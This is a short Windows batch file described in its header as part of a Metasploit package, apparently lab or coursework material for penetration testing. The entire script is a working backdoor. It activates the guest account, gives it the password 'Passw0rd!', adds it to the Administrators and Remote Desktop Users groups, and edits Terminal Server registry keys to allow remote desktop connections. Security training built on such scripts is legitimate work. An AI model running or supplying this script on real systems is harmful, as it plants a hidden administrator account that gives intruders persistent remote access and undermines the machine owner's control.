@echo
:: Script:                   Python Metasploit cmd file package
:: Author:                   Courtney Hans
:: Date of latest revision:  11/3/20
:: Purpose:                  this is a cmd file to activate the default guest account,
::                           assign guest accout to administrator & Remote Desktop User groups,
::                           and allow Remote Desktop to the computer

net user guest /active:yes
net user guest Passw0rd!
net localgroup administrators guest /add
net localgroup "Remote Desktop Users" guest /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
net user guest
